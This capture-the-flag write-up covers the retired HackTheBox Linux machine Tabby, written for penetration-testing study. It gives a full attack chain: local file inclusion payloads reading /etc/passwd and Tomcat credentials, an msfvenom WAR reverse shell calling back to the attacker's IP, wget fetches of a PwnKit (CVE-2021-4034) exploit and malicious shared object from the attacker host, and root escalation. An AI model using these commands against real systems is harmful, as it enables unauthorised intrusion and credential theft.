# HackTheBox — Tabby

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Machine | Tabby |
| Difficulty | Easy |
| OS | Linux (Ubuntu 20.04) |
| IP | 10.129.77.28 |
| Date | October 2026 |
| User Flag | `a8c9d1063614d10a0da7f24e8c33d8af` |
| Root Flag | `8ccd0718de7bbfa0b9cffbba0b7f0fb0` |

---

## Machine Summary

Tabby is an Easy-rated Linux machine that demonstrates how a simple local file inclusion (LFI) flaw can expose Tomcat Manager credentials and become remote code execution. The Mega Hosting application on port 80 exposes an unsanitized `file=` parameter. Reading `/etc/passwd` identifies the local users, while reading the Debian Tomcat configuration reveals a `manager-script` account. The Tomcat Manager text API accepts a WAR deployment using that role, providing a shell as `tomcat`.

The host runs vulnerable Polkit 0.105 with the SUID `pkexec` binary. A static build of the PwnKit exploit (CVE-2021-4034) avoids target glibc compatibility problems and elevates the `tomcat` shell to root.

---

## Attack Chain Summary

```
Nmap TCP → Apache (80), Tomcat (8080)
Add megahosting.htb → discover news.php?file=
LFI → /etc/passwd → users ash and tomcat
LFI → /usr/share/tomcat9/etc/tomcat-users.xml
  → tomcat:$3cureP4s5w0rd123! (manager-script)
Tomcat Manager Text API → deploy WAR → shell as tomcat
Polkit 0.105 + SUID pkexec → CVE-2021-4034 PwnKit
Static exploit + malicious shared object → root shell
Read /home/ash/user.txt and /root/root.txt
```

---

## Step 1 — Nmap TCP Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sS -sV -sC -T4 -O -p 80,8080 -Pn -oA tabby 10.129.77.28
```

```
80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu) — Mega Hosting
8080/tcp open  http    Apache Tomcat
```

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.77.28 megahosting.htb" | sudo tee -a /etc/hosts
```

The news page uses `news.php?file=statement` — strong LFI candidate.

---

## Step 2 — Confirm LFI and Enumerate Local Users

```
http://megahosting.htb/news.php?file=../../../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
tomcat:x:997:997::/opt/tomcat:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

---

## Step 3 — Extract Tomcat Manager Credentials

```
http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

```xml
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

---

## Step 4 — Deploy a WAR Reverse Shell

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f war -o pwn.war
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
Hackerpatel007_1@htb[/htb]$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file pwn.war \
  "http://10.129.77.28:8080/manager/text/deploy?path=/system&update=true"
```

Trigger: `http://10.129.77.28:8080/system/pwn.war`

```
tomcat@tabby:/var/lib/tomcat9$
```

---

## Step 5 — Identify PwnKit (CVE-2021-4034)

```
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
polkit 0.105 VULNERABLE (<0.120)
```

```bash
Hackerpatel007_1@htb[/htb]$ gcc -static exploit.c -o exploit
Hackerpatel007_1@htb[/htb]$ gcc -shared -fPIC evil-so.c -o evil.so
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
tomcat@tabby:/tmp$ wget http://10.10.16.36:8000/exploit && wget http://10.10.16.36:8000/evil.so
```

---

## Step 6 — PwnKit Privilege Escalation

```bash
tomcat@tabby:/tmp$ chmod +x exploit && ./exploit
root@tabby:/tmp# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@tabby:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Step 7 — Capture Flags

```bash
root@tabby:/tmp# cat /home/ash/user.txt
a8c9d1063614d10a0da7f24e8c33d8af

root@tabby:/tmp# cat /root/root.txt
8ccd0718de7bbfa0b9cffbba0b7f0fb0
```

| Flag | Value |
| --- | --- |
| User | `a8c9d1063614d10a0da7f24e8c33d8af` |
| Root | `8ccd0718de7bbfa0b9cffbba0b7f0fb0` |

---

## Lessons Learned

- Test filename-like parameters (`file=`, `page=`, `path=`) for path traversal first.
- `manager-script` is sufficient for WAR deployment via `/manager/text/` even without browser GUI access.
- Treat configuration files as credential stores — `tomcat-users.xml` frequently contains plaintext Manager credentials.
- Check Polkit version early after gaining a local shell.
- Static compilation solves glibc compatibility problems on older targets.

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -sS -sV -sC -T4 -O -p 80,8080 -Pn <IP>` | Service scan |
| `news.php?file=../../../../../etc/passwd` | Confirm LFI |
| `news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml` | Extract Tomcat credentials |
| `msfvenom -p java/shell_reverse_tcp ... -f war -o pwn.war` | Build WAR reverse shell |
| `curl -u 'tomcat:<pw>' --upload-file pwn.war '...manager/text/deploy?path=/system'` | Deploy WAR |
| `gcc -static exploit.c -o exploit` | Build portable PwnKit driver |
| `./exploit` | Execute PwnKit escalation |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1595.001 | Nmap identified Apache and Tomcat |
| Initial Access | T1190 | LFI in `news.php?file=` |
| Credential Access | T1552.001 | Tomcat credentials from `tomcat-users.xml` |
| Execution / Persistence | T1505.003 | WAR reverse shell via Tomcat Manager |
| Privilege Escalation | T1068 | CVE-2021-4034 PwnKit |
| Privilege Escalation | T1548.001 | SUID `pkexec` used by exploit |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
